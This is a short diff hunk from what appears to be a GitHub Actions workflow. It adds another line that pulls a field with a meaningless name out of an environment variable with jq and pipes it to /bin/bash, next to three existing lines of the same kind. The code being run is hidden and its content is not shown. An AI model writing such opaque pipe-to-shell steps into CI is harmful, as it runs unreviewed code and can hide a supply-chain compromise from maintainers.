@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ln3" | jq -r .fyx3 | /bin/bash
           echo $ps63 | jq -r .p58 | /bin/bash
           echo $ktdx6610 | jq -r .b82 | /bin/bash
+          echo $frm3845 | jq -r .qcut16901 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
